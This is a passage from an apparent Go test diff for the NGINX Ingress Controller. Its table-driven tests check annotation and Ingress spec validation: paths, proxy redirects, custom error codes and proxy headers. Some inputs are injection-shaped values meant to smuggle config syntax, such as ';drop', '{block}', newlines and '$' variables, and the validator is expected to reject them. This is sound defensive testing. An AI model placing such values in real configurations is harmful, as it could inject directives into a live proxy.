+				"nginx.org/app-root": "/coffee/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/coffee/": path should not end with '/'`,
+			},
+			msg: "invalid nginx.org/app-root annotation, cannot end with slash",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/tea$1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/tea$1": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid nginx.org/app-root annotation, contains dollar sign",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/tea~1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/tea~1": path must not contain the '~' character`,
+			},
+			msg: "invalid nginx.org/app-root annotation, contains tilde",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/coffee{test}",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/app-root: Invalid value: \"/coffee{test}\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+				`annotations.nginx.org/app-root: Invalid value: "/coffee{test}": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid app-root - contains curly braces",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/tea;chai",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/app-root: Invalid value: \"/tea;chai\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+				`annotations.nginx.org/app-root: Invalid value: "/tea;chai": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid app-root - contains semicolon",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/tea chai",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/app-root: Invalid value: \"/tea chai\": must start with / and must not include any whitespace character, `{`, `}` or `;` (e.g. '/',  or '/path',  or '/path/subpath-123', regex used for validation is '/[^\\s{};\\\\]*')",
+				`annotations.nginx.org/app-root: Invalid value: "/tea chai": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid app-root - contains whitespace",
+		},
+		{
+			annotations: map[string]string{
+				listenPortsAnnotation: "80,8080",
+			},
+			specServices: map[string]bool{},
+			hostless:     true,
+			expectedErrors: []string{
+				"annotations.nginx.org/listen-ports: Forbidden: annotation is not supported for hostless Ingress",
+			},
+			msg: "reject hostless listen-ports",
+		},
+		{
+			annotations: map[string]string{
+				listenPortsSSLAnnotation: "443,8443",
+			},
+			specServices: map[string]bool{},
+			hostless:     true,
+			expectedErrors: []string{
+				"annotations.nginx.org/listen-ports-ssl: Forbidden: annotation is not supported for hostless Ingress",
+			},
+			msg: "reject hostless listen-ports-ssl",
+		},
+		{
+			annotations: map[string]string{
+				serverSnippetsAnnotation: "return 200;",
+			},
+			specServices:    map[string]bool{},
+			hostless:        true,
+			snippetsEnabled: true,
+			expectedErrors:  nil,
+			msg:             "allow hostless server-snippets when snippets enabled",
+		},
+		{
+			annotations: map[string]string{
+				basicAuthSecretAnnotation: "auth-secret",
+			},
+			specServices:   map[string]bool{},
+			hostless:       true,
+			expectedErrors: nil,
+			msg:            "allow hostless basic-auth",
+		},
+		{
+			annotations: map[string]string{
+				hstsAnnotation:             "true",
+				proxyHideHeadersAnnotation: "Server",
+			},
+			specServices:   map[string]bool{},
+			hostless:       true,
+			expectedErrors: nil,
+			msg:            "allow hostless overrideable defaults",
+		},
+
+		// nginx.org/proxy-redirect-from annotation tests
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "off",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/proxy-redirect-from annotation with 'off'",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "default",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/proxy-redirect-from annotation with 'default'",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://cafe.example.com/v1/",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/coffee/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/proxy-redirect-from annotation with URL",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "~^http://cafe.example.com/v(\\d+)/(.*)",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/coffee/$2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/proxy-redirect-from annotation with regex and capture group",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://cafe.example.com/$1",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/coffee/$1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/proxy-redirect-from annotation with dollar sign variable",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://bad.example.com/;drop",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-from: Invalid value: "http://bad.example.com/;drop": must not contain ';', '{', '}', newline, carriage return, backtick, whitespace, or '#'`,
+			},
+			msg: "invalid nginx.org/proxy-redirect-from annotation with semicolon",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://bad.example.com/{block}",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-from: Invalid value: "http://bad.example.com/{block}": must not contain ';', '{', '}', newline, carriage return, backtick, whitespace, or '#'`,
+			},
+			msg: "invalid nginx.org/proxy-redirect-from annotation with curly brace",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://bad.example.com/\npath",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/proxy-redirect-from: Invalid value: \"http://bad.example.com/\\npath\": must not contain ';', '{', '}', newline, carriage return, backtick, whitespace, or '#'",
+			},
+			msg: "invalid nginx.org/proxy-redirect-from annotation with newline",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://bad example.com/path",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-from: Invalid value: "http://bad example.com/path": must not contain ';', '{', '}', newline, carriage return, backtick, whitespace, or '#'`,
+			},
+			msg: "invalid nginx.org/proxy-redirect-from annotation with whitespace",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://bad.example.com/path#fragment",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-from: Invalid value: "http://bad.example.com/path#fragment": must not contain ';', '{', '}', newline, carriage return, backtick, whitespace, or '#'`,
+			},
+			msg: "invalid nginx.org/proxy-redirect-from annotation with hash character",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: `~^http://bad.example.com/v(\d+)/(.*`,
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/coffee/$2",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-from: Invalid value: "~^http://bad.example.com/v(\\d+)/(.*": invalid regex pattern`,
+			},
+			msg: "invalid nginx.org/proxy-redirect-from annotation with malformed regex",
+		},
+
+		// nginx.org/proxy-redirect-to annotation tests
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://cafe.example.com/v1/",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/coffee/",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/proxy-redirect-to annotation with URL",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "~^http://cafe.example.com/(.*)",
+				configs.ProxyRedirectToAnnotation:   "http://$host/coffee/$1",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/proxy-redirect-to annotation with NGINX variable $host",
+		},
+		{
+			annotations: map[string]string{
+				configs.ProxyRedirectFromAnnotation: "http://cafe.example.com/v1/",
+				configs.ProxyRedirectToAnnotation:   "http://cafe.example.com/;drop",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-redirect-to: Invalid value: "http://cafe.example.com/;drop": must not contain ';', '{', '}', newline, carriage return, backtick, whitespace, or '#'`,
+			},
+			msg: "invalid nginx.org/proxy-redirect-to annotation with semicolon",
+		},
+
+		// nginx.org/custom-http-errors annotation tests
+		{
+			annotations: map[string]string{
+				configs.CustomHTTPErrorsAnnotation: "404,500,502",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/custom-http-errors annotation with comma-separated codes",
+		},
+		{
+			annotations: map[string]string{
+				configs.CustomHTTPErrorsAnnotation: "4xx, 5xx",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors:       nil,
+			msg:                  "valid nginx.org/custom-http-errors annotation with range shorthands",
+		},
+		{
+			annotations: map[string]string{
+				configs.CustomHTTPErrorsAnnotation: "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/custom-http-errors: Required value`,
+			},
+			msg: "empty nginx.org/custom-http-errors annotation rejected",
+		},
+		{
+			annotations: map[string]string{
+				configs.CustomHTTPErrorsAnnotation: "299",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/custom-http-errors: Invalid value: "299": invalid status code 299: must be in the range [300, 599]`,
+			},
+			msg: "nginx.org/custom-http-errors code below 300 rejected",
+		},
+		{
+			annotations: map[string]string{
+				configs.CustomHTTPErrorsAnnotation: "6xx",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/custom-http-errors: Invalid value: "6xx": invalid status code "6xx": must be an integer, '4xx', or '5xx'`,
+			},
+			msg: "nginx.org/custom-http-errors unsupported range shorthand rejected",
+		},
+	}
+
+	for _, test := range tests {
+		t.Run(test.msg, func(t *testing.T) {
+			allErrs := validateIngressAnnotations(
+				IngressOpts{
+					isPlus:               test.isPlus,
+					appProtectEnabled:    test.appProtectEnabled,
+					appProtectDosEnabled: test.appProtectDosEnabled,
+					snippetsEnabled:      test.snippetsEnabled,
+					directiveAutoAdjust:  test.directiveAutoAdjust,
+					hostless:             test.hostless,
+				},
+				test.annotations,
+				test.specServices,
+				field.NewPath("annotations"),
+			)
+			assertion := assertErrors("validateIngressAnnotations()", test.msg, allErrs, test.expectedErrors)
+			if assertion != "" {
+				t.Error(assertion)
+			}
+		})
+	}
+}
+
+func TestValidateIngressSpec(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		spec                  *networking.IngressSpec
+		allowEmptyIngressHost bool
+		expectedErrors        []field.ErrorType
+		msg                   string
+	}{
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: nil,
+			msg:            "valid input",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: `/tea\{custom_value}`,
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeInvalid,
+			},
+			msg: "test invalid characters in path",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: `/tea\{custom_value}`,
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeInvalid,
+			},
+			msg: "test invalid characters in path",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: `/tea\`,
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeInvalid,
+			},
+			msg: "test invalid characters in path",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: `/tea\n`,
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeInvalid,
+			},
+			msg: "test invalid characters in path",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "",
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeRequired,
+			},
+			msg: "test empty in path",
+		},
+		{
+			spec: &networking.IngressSpec{
+				DefaultBackend: &networking.IngressBackend{
+					Service: &networking.IngressServiceBackend{},
+				},
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+					},
+				},
+			},
+			expectedErrors: nil,
+			msg:            "valid input with default backend",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeRequired,
+			},
+			msg: "zero rules",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "",
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeRequired,
+			},
+			msg: "empty host",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+					},
+					{
+						Host: "foo.example.com",
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeDuplicate,
+			},
+			msg: "duplicated host",
+		},
+		{
+			spec: &networking.IngressSpec{
+				DefaultBackend: &networking.IngressBackend{
+					Resource: &v1.TypedLocalObjectReference{},
+				},
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeForbidden,
+			},
+			msg: "invalid default backend",
+		},
+		{
+			spec: &networking.IngressSpec{
+				DefaultBackend: &networking.IngressBackend{},
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeRequired,
+			},
+			msg: "empty default backend with nil service",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path:    "/",
+										Backend: networking.IngressBackend{},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeRequired,
+			},
+			msg: "empty path backend with nil service",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Resource: &v1.TypedLocalObjectReference{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeForbidden,
+			},
+			msg: "invalid backend",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{{Host: ""}},
+			},
+			allowEmptyIngressHost: true,
+			expectedErrors:        nil,
+			msg:                   "valid empty host when allowed",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{{Host: ""}, {Host: ""}},
+			},
+			allowEmptyIngressHost: true,
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeDuplicate,
+			},
+			msg: "reject duplicate empty host rules when empty host is allowed",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{{Host: ""}},
+			},
+			allowEmptyIngressHost: false,
+			expectedErrors: []field.ErrorType{
+				field.ErrorTypeRequired,
+			},
+			msg: "reject empty host when not allowed",
+		},
+	}
+
+	for _, test := range tests {
+		allErrs := validateIngressSpec(test.spec, field.NewPath("spec"), test.allowEmptyIngressHost)
+		assertion := assertErrorTypes(test.msg, allErrs, test.expectedErrors)
+		if assertion != "" {
+			t.Error(assertion)
+		}
+	}
+}
+
+func TestValidateChallengeIngress(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		spec           *networking.IngressSpec
+		expectedErrors []string
+		msg            string
+	}{
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{
+												Name: "svc",
+												Port: networking.ServiceBackendPort{Number: 8080},
+											},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: nil,
+			msg:            "valid input",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Resource: &v1.TypedLocalObjectReference{},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []string{
+				`spec.rules.HTTP.Paths[0].Backend.Service: Required value: challenge Ingress must have a Backend Service defined`,
+			},
+			msg: "resource backend is rejected",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+										Backend: networking.IngressBackend{
+											Service: &networking.IngressServiceBackend{
+												Name: "svc",
+												Port: networking.ServiceBackendPort{Name: "http"},
+											},
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []string{
+				`spec.rules.HTTP.Paths[0].Backend.Service.Port.Name: Forbidden: challenge Ingress must have a Backend Service Port Number defined, not Name`,
+			},
+			msg: "named service port is forbidden",
+		},
+	}
+
+	for _, test := range tests {
+		allErrs := validateChallengeIngress(test.spec, field.NewPath("spec"))
+		assertion := assertErrors("validateChallengeIngress()", test.msg, allErrs, test.expectedErrors)
+		if assertion != "" {
+			t.Error(assertion)
+		}
+	}
+}
+
+func TestValidateMasterSpec(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		spec           *networking.IngressSpec
+		expectedErrors []string
+		msg            string
+	}{
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: nil,
+			msg:            "valid input",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+					},
+					{
+						Host: "bar.example.com",
+					},
+				},
+			},
+			expectedErrors: []string{
+				"spec.rules: Too many: 2: must have at most 1 item",
+			},
+			msg: "too many hosts",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []string{
+				"spec.rules[0].http.paths: Too many: 1: must have at most 0 items",
+			},
+			msg: "too many paths",
+		},
+	}
+
+	for _, test := range tests {
+		allErrs := validateMasterSpec(test.spec, field.NewPath("spec"))
+		assertion := assertErrors("validateMasterSpec()", test.msg, allErrs, test.expectedErrors)
+		if assertion != "" {
+			t.Error(assertion)
+		}
+	}
+}
+
+func TestValidateMinionSpec(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		spec           *networking.IngressSpec
+		expectedErrors []string
+		msg            string
+	}{
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: nil,
+			msg:            "valid input",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+					},
+					{
+						Host: "bar.example.com",
+					},
+				},
+			},
+			expectedErrors: []string{
+				"spec.rules: Too many: 2: must have at most 1 item",
+			},
+			msg: "too many hosts",
+		},
+		{
+			spec: &networking.IngressSpec{
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []string{
+				"spec.rules[0].http.paths: Required value: must include at least one path",
+			},
+			msg: "too few paths",
+		},
+		{
+			spec: &networking.IngressSpec{
+				TLS: []networking.IngressTLS{
+					{
+						Hosts: []string{"foo.example.com"},
+					},
+				},
+				Rules: []networking.IngressRule{
+					{
+						Host: "foo.example.com",
+						IngressRuleValue: networking.IngressRuleValue{
+							HTTP: &networking.HTTPIngressRuleValue{
+								Paths: []networking.HTTPIngressPath{
+									{
+										Path: "/",
+									},
+								},
+							},
+						},
+					},
+				},
+			},
+			expectedErrors: []string{
+				"spec.tls: Too many: 1: must have at most 0 items",
+			},
+			msg: "tls is forbidden",
+		},
+	}
+
+	for _, test := range tests {
+		allErrs := validateMinionSpec(test.spec, field.NewPath("spec"))
+		assertion := assertErrors("validateMinionSpec()", test.msg, allErrs, test.expectedErrors)
+		if assertion != "" {
+			t.Error(assertion)
+		}
+	}
+}
+
+func assertErrorTypes(msg string, allErrs field.ErrorList, expectedErrors []field.ErrorType) string {
+	returnedErrors := errorListToTypes(allErrs)
+	if !reflect.DeepEqual(returnedErrors, expectedErrors) {
+		return fmt.Sprintf("%s returned %s but expected %s", msg, returnedErrors, expectedErrors)
+	}
+	return ""
+}
+
+func assertErrors(funcName string, msg string, allErrs field.ErrorList, expectedErrors []string) string {
+	errors := errorListToStrings(allErrs)
+	if !reflect.DeepEqual(errors, expectedErrors) {
+		result := strings.Join(errors, "\n")
+		expected := strings.Join(expectedErrors, "\n")
+
+		return fmt.Sprintf("%s returned \n%s \nbut expected \n%s \nfor the case of %s", funcName, result, expected, msg)
+	}
+
+	return ""
+}
+
+func errorListToStrings(list field.ErrorList) []string {
+	var result []string
+
+	for _, e := range list {
+		result = append(result, e.Error())
+	}
+
+	return result
+}
+
+func errorListToTypes(list field.ErrorList) []field.ErrorType {
+	var result []field.ErrorType
+
+	for _, e := range list {
+		result = append(result, e.Type)
+	}
+
+	return result
+}
+
+func TestValidateProxySetHeaderAnnotation(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name           string
+		value          string
+		expectedErrors []string
+	}{
+		// ── Valid inputs ──────────────────────────────────────────────
+		{
+			name:           "valid single header name",
+			value:          "X-Custom-Header",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid header name with value",
+			value:          "X-Custom-Header: myvalue",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid multiple header names comma-separated",
+			value:          "Header-1,Header-2,Header-3",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid multiple headers with values",
+			value:          "Header-1: val1,Header-2: val2",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid mixed headers some with values some without",
+			value:          "Header-1,Header-2: val2",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid headers with extra whitespace around commas",
+			value:          "Header-1 , Header-2 , Header-3",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid header with colon but empty value",
+			value:          "X-Custom-Header:",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid header with colon and whitespace-only value",
+			value:          "X-Custom-Header:   ",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid header name is all digits",
+			value:          "123",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid single character header",
+			value:          "X",
+			expectedErrors: nil,
+		},
+		{
+			name:           "valid header with value containing spaces",
+			value:          "X-Header: some value with spaces",
+			expectedErrors: nil,
+		},
+
+		// ── Invalid: $ character ─────────────────────────────────────
+		{
+			name:  "invalid dollar sign in value",
+			value: "X-Header: $upstream_addr",
+			expectedErrors: []string{
+				`annotations.nginx.org/proxy-set-headers: Invalid value: "X-Header: $upstream_addr": invalid character in header value: $`,
+			},
+		},
+		{
+			name:  "invalid dollar sign in value of second header",
+			value: "Header-1: ok,Header-2: $bad",
+			expectedErrors: []string{
